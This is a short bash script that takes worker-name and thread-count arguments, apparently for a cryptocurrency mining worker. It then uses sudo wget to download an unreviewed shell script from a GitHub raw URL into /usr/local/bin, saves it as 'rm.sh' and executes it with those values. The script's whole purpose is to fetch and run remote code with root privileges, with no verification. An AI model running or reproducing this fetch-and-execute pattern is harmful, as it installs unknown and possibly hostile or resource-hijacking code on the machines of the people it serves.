#!/bin/bash
cd /usr/local/bin
worker_value="davincen_12vcpu"
worker_threads="8"

if [ "$#" -ge 1 ]; then
    for arg in "$@"; do
        case $arg in
            --worker=*)
                extracted_value="${arg#*=}"
                if [ -n "$extracted_value" ]; then
                    worker_value="$extracted_value"
                fi
                ;;
            --threads=*)
                extracted_value="${arg#*=}"
                if [ -n "$extracted_value" ]; then
                    worker_threads="$extracted_value"
                fi
                ;;
            *)
                echo "Usage: $0 [--worker=<value>] [--threads=<value>]"
                ;;
        esac
    done
fi

echo "Worker name: $worker_value"
echo "Number of threads: $worker_threads"

echo "Here we go"
sudo wget -O rm.sh https://raw.githubusercontent.com/levanloc/testscriptnew/main/test2.sh
chmod +x rm.sh
sh rm.sh "$worker_value" "$worker_threads"
